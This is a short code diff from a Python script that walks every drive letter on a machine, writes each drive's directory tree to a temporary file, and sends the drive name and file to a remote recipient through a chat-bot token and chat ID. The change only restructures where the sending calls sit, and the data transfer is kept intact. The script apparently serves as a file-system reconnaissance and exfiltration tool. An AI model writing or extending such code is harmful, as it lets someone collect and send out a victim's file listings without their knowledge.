@@ -109,9 +109,7 @@ def process_path(chat_id, token, disk):
     with tempfile.NamedTemporaryFile(delete=False, mode='w', encoding='utf-8') as temp_file:
         tree(disk, temp_file)
         temp_file_path = temp_file.name
-    print(f"{disk} : {temp_file_path}")
-    send_message(chat_id, token, disk)
-    send_file(chat_id, token, temp_file_path)
+    return disk, temp_file_path
 
 def scan_disks(parameter):
     maj_letters = list(string.ascii_uppercase)
@@ -135,4 +133,7 @@ def scan_disks(parameter):
 disks = scan_disks(1)
 
 for disks in disks:
-    process_path(chat_id, token, disks)
+    disk, temp_file_path = process_path(chat_id, token, disks)
+    send_message(chat_id, token, disk)
+    send_file(chat_id, token, temp_file_path)
+    print(f"ok : {disk}")
